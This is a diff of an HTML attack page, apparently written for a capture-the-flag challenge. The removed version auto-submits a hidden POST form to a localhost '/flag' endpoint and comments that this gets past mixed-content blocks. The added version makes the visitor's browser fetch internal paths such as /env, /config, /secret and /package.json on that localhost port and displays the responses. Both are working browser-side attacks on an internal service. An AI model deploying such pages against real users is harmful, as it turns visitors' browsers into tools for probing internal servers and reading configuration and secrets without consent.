@@ -1,21 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>POST Navigation Exploit</title>
+    <title>Internal Route Fuzzer</title>
+    <style>
+        body { font-family: monospace; padding: 15px; background: #111; color: #0f0; }
+        .ok { color: #0f6; font-weight: bold; }
+        .other { color: #ff0; }
+        pre { background: #222; padding: 8px; color: #fff; border: 1px solid #443; overflow-x: auto; }
+    </style>
 </head>
 <body>
-    <h2>Submitting to Flag Endpoint...</h2>
-    
-    <!-- target="_self" forces the main window to navigate to the local HTTP endpoint, bypassing mixed content iframe blocks -->
-    <form id="autoForm" action="http://127.0.0.1:31326/flag" method="POST">
-        <!-- Include potential required parameters just in case -->
-        <input type="hidden" name="submit" value="1">
-    </form>
+    <h2>Internal Endpoint & Directory Fuzzer</h2>
+    <div id="results">Scanning internal server at http://127.0.0.1:31326 ...</div>
 
     <script>
-        setTimeout(() => {
-            document.getElementById('autoForm').submit();
-        }, 300);
+        const baseUrl = 'http://127.0.0.1:31326';
+        
+        // List of common CTF endpoints, files, and directories to check
+        const paths = [
+            '/', '/flag', '/flag.txt', '/admin', '/api', '/debug', '/status', 
+            '/robots.txt', '/source', '/file', '/files', '/download',
+            '/config', '/env', '/secret', '/app.js', '/server.js',
+            '/package.json', '/metrics', '/health', '/info', '/index.js'
+        ];
+
+        const resultsDiv = document.getElementById('results');
+        resultsDiv.innerHTML = ''; // Clear loading text
+
+        paths.forEach(path => {
+            const target = baseUrl + path;
+            
+            fetch(target)
+                .then(async res => {
+                    const text = await res.text();
+                    const cssClass = res.status === 200 ? 'ok' : 'other';
+                    
+                    // Display status code, path, and response length on the page
+                    let html = `<div class="${cssClass}">[Status: ${res.status}] Path: ${path} (Bytes: ${text.length})</div>`;
+                    
+                    // If it returned content, show a snippet of it
+                    if (text.length > 0 && text.length < 1000) {
+                        html += `<pre>${text.replace(/</g, "&lt;").replace(/>/g, "&gt;")}</pre>`;
+                    }
+                    
+                    resultsDiv.innerHTML += html + '<hr style="border-color: #333;">';
+                })
+                .catch(err => {
+                    // Ignore closed or unreachable ports/paths silently
+                });
+        });
     </script>
 </body>
 </html>
